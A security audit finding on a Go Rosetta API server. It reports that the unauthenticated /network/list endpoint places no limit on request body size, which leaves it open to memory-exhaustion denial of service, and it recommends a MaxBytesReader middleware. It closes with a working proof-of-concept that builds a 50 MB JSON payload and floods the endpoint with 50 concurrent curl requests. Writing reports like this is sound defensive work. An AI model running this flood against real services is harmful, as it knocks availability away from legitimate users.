### Title
Unbounded Request Body Deserialization in `NetworkList()` Enables Memory-Exhaustion Griefing

### Summary
The `/network/list` endpoint accepts a `MetadataRequest` whose `Metadata` field is `map[string]interface{}` — arbitrary JSON — with no body size cap enforced anywhere in the middleware stack or HTTP server configuration. An unprivileged attacker can flood the endpoint with oversized JSON payloads that are fully deserialized into heap memory by the rosetta-sdk-go controller before `NetworkList()` is ever invoked, causing sustained memory pressure that degrades availability for all users.

### Finding Description
**Code path:**

`rosetta/main.go` lines 220–227 — the `http.Server` is constructed with only timeout fields; no `http.MaxBytesReader` is applied to the request body at any layer:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

`rosetta/app/services/network_service.go` lines 27–32 — `NetworkList()` discards the `MetadataRequest` with `_`, but deserialization into `map[string]interface{}` already occurred in the rosetta-sdk-go `NetworkAPIController` before this function is reached:

```go
func (n *networkAPIService) NetworkList(
    _ context.Context,
    _ *rTypes.MetadataRequest,
) (*rTypes.NetworkListResponse, *rTypes.Error) {
    return &rTypes.NetworkListResponse{...}, nil
}
```

The middleware chain (`MetricsMiddleware` → `TracingMiddleware` → `CorsMiddleware` → router, `rosetta/main.go` lines 217–219) applies no body size restriction. A grep across the entire Go codebase for `MaxBytesReader`, `LimitReader`, `MaxBytes`, or any body-limit primitive returns zero matches.

**Root cause:** The `Http` config struct (`rosetta/app/config/types.go` lines 64–69) exposes only timeout knobs — no `MaxBodyBytes` field exists. The rosetta-sdk-go controller calls `json.NewDecoder(r.Body).Decode(&metadataRequest)` on an unlimited stream. Because `MetadataRequest.Metadata` is `map[string]interface{}`, the Go JSON decoder will allocate arbitrarily large maps and nested structures entirely in heap memory before returning control to application code.

**Failed assumption:** The developers assumed that `ReadTimeout` (a time-based limit) is sufficient to bound memory consumption. It is not: on a fast or co-located connection, gigabytes of JSON can be transmitted well within any reasonable timeout window.

### Impact Explanation
Each oversized request causes the Go runtime to allocate heap memory proportional to the payload size during JSON deserialization. Concurrent floods of such requests can exhaust available memory, triggering the OOM killer or causing GC pressure severe enough to stall all goroutines. Because `/network/list` is a public, unauthenticated endpoint required by the Rosetta API specification, it cannot be gated behind authentication. All legitimate users sharing the same service instance are affected.

### Likelihood Explanation
No authentication, API key, or rate-limiting is required. Any internet-reachable instance is vulnerable. The attack is trivially scriptable (`curl` or any HTTP client in a loop), requires no special knowledge of the protocol, and is fully repeatable. The attacker bears no cost beyond bandwidth.

### Recommendation
Wrap `r.Body` with `http.MaxBytesReader` in a middleware applied before routing, e.g.:

```go
func BodyLimitMiddleware(next http.Handler, maxBytes int64) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
        next.ServeHTTP(w, r)
    })
}
```

Insert this into the chain in `rosetta/main.go` before `corsMiddleware`. A limit of 1–4 MB is appropriate for all Rosetta endpoints. Additionally, add a `MaxBodyBytes int64` field to the `Http` config struct in `rosetta/app/config/types.go` so the limit is operator-configurable.

### Proof of Concept
```bash
# Generate a ~50 MB MetadataRequest payload
python3 -c "
import json, sys
payload = {'metadata': {'x': 'A' * 50_000_000}}
sys.stdout.write(json.dumps(payload))
" > big_payload.json

# Flood the endpoint concurrently (no auth required)
for i in $(seq 1 50); do
  curl -s -X POST http://<rosetta-host>:<port>/network/list \
       -H 'Content-Type: application/json' \
       --data-binary @big_payload.json &
done
wait
```

Each concurrent request forces the server to deserialize 50 MB of JSON into `map[string]interface{}` heap allocations. With 50 parallel requests, this attempts to allocate ~2.5 GB of heap, causing severe GC pressure or OOM termination, making the service unavailable to legitimate callers.